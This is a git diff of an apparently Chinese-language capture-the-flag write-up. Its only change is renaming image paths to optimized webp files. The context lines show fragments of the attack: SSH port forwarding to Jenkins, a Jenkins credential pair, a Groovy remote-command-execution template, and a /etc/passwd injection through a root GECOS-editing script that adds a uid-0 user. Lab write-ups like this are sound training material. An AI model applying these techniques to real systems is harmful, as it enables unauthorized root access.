@@ -57,7 +57,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 19.53 seconds
 ```
 
-![1787461367138](/assets/img/typora/1787461367138.png)
+![1787461367138](/assets/img/optimized/typora/1787461367138.webp)
 
 # USERFLAG
 
@@ -323,7 +323,7 @@ url -s -c cookies.txt "http://127.0.0.1:8080" > /dev/null
 ssh -L 9090:127.0.0.1:8080 gaoyan8764@192.168.1.41
 ```
 
-![1787465182086](/assets/img/typora/1787465182086.png)
+![1787465182086](/assets/img/optimized/typora/1787465182086.webp)
 
 ```bash
 jenkins/Jenkins6530#Admin
@@ -331,7 +331,7 @@ jenkins/Jenkins6530#Admin
 
 登录
 
-![1787465623479](/assets/img/typora/1787465623479.png)
+![1787465623479](/assets/img/optimized/typora/1787465623479.webp)
 
 执行命令
 
@@ -339,7 +339,7 @@ jenkins/Jenkins6530#Admin
 Groovy RCE：["/bin/sh","-c",命令].execute() 基本格式
 ```
 
-![1787465658624](/assets/img/typora/1787465658624.png)
+![1787465658624](/assets/img/optimized/typora/1787465658624.webp)
 
 edit_passwd,这是root 的 shell 脚本，功能是改 /etc/passwd 的 GECOS 字段
 
@@ -351,7 +351,7 @@ edit_passwd,这是root 的 shell 脚本，功能是改 /etc/passwd 的 GECOS 字
 openssl passwd -6 -salt haxsalt Hax12345
 ```
 
-![1787465715889](/assets/img/typora/1787465715889.png)
+![1787465715889](/assets/img/optimized/typora/1787465715889.webp)
 
 ```
 edit_passwd把GECOS参数原样写进文件
@@ -397,7 +397,7 @@ jenkins:x:1001:1001:AA
 lily:$6$haxsalt$gxrczA.vOFX5W4cTR6qIqEUpzyuo8/3NiYWb9dJTLJx5SEJTH09cOpLa8tEU8xdP21nO/Q901USXRVra7xpNj/:0:0:lily:/var/lib/jenkins:/bin/bash
 ```
 
-![1787466786533](/assets/img/typora/1787466786533.png)
+![1787466786533](/assets/img/optimized/typora/1787466786533.webp)
 
 
 
